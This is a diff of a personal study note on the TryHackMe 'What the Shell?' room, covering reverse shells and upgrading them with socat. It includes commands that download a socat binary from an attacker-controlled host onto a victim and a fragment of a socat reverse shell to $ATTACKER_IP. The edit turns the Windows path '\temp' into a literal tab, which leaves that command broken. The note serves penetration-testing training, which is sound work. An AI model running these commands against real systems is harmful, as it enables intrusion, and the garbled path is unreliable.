@@ -1,5 +1,8 @@
 # TryHackMe: Complete Beginner
 
+author:: Nathan Acks  
+date:: 2021-10-27
+
 ## What the Shell?
 
 ### What Is a Shell?
@@ -62,7 +65,7 @@ You can *mostly* bypass the need for the `stty` command by using `rlwrap`, which
 It’s also possible to upgrade to a socat-powered shell, assuming that you have a statically-compiled version of socat. Typically, the way that you’d transfer this binary is by first spinning up a simply webserver in the directory with your socat binary on the attack machine, and then downloading that binary to the vicitim.
 
 * UNIX LIKE: `wget $ATTACKER_IP/socat -O /tmp/socat`
-* WINDOWS (POWERSHELL): `Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`
+* WINDOWS (POWERSHELL): `Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\Windows	emp\socat.exe`
 
 NOTE that in *none* of these cases will the reverse shell pick up on your terminal size, so you’ll need to manually specify it using `stty rows` and `stty cols`.
 
@@ -105,8 +108,3 @@ socat TCP:$ATTACKER_IP:$LISTENER_PORT \
 ```
 
 NOTE that it’s perfectly acceptable to kick off a socat process from inside a netcat process!
-
-- - - -
-
-<span aria-hidden="true">👤</span> Nathan Acks  
-<span aria-hidden="true">📅</span> October 27, 2021
